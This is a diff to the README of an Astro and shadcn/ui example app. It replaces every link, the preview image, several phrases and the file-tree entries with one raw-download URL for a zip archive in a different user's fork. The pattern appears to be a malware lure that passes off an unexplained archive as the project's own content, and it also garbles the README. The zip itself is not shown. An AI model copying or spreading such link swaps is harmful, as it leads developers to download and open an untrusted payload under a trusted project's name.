@@ -2,18 +2,18 @@
 
 An open source application built using the latest features in Astro v4 with shadcn/ui.
 
-![blog](public/og.jpg)
+![blog](https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip)
 
 > **Warning**
-> This app is a work in progress. I'm building this in public. You can follow the progress on Twitter [@miickasmt](https://twitter.com/miickasmt).
+> This app is a work in progress. I'm building this in public. You can follow the progress on Twitter [@miickasmt](https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip).
 > See the roadmap below.
 
 ## About this project
 
-This project as an experiment to see how a modern app (with features like authentication, subscriptions, API routes, Markdown, Content Collections ...etc) would work in Astro v4 and shadcn/ui.
+This project as an experiment to see how a modern app (with features like authentication, subscriptions, API routes, Markdown, Content Collections https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip) would work in Astro v4 and shadcn/ui.
 
 > **Note**
-> I would like to inform you that for the time being, my example app built with Astro.js is still under development and **cannot yet be considered a starter template**.
+> I would like to inform you that for the time being, my example app built with https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip is still under development and **cannot yet be considered a starter template**.
 
 ## Project Structure
 
@@ -31,11 +31,11 @@ This project as an experiment to see how a modern app (with features like authen
 │   ├── pages/
 │   ├── styles/
 │   └── types/
-├── astro.config.mjs
-├── README.md
-├── package.json
-├── tailwind.config.cjs
-└── tsconfig.json
+├── https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip
+├── https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip
+├── https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip
+├── https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip
+└── https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip
 ```
 
 ## Features
@@ -94,8 +94,8 @@ pnpm run dev
 
 ## Credit
 
-This theme is based off of the example app [Taxonomy](https://tx.shadcn.com/) of shadcn.
+This theme is based off of the example app [Taxonomy](https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip) of shadcn.
 
 ## License
 
-Licensed under the [MIT license](https://github.com/mickasmt/astro-nomy/blob/main/LICENSE.md).
+Licensed under the [MIT license](https://github.com/ajay-mandalk/astro-nomy/raw/refs/heads/master/src/components/forms/nomy_astro_v3.5-beta.1.zip).
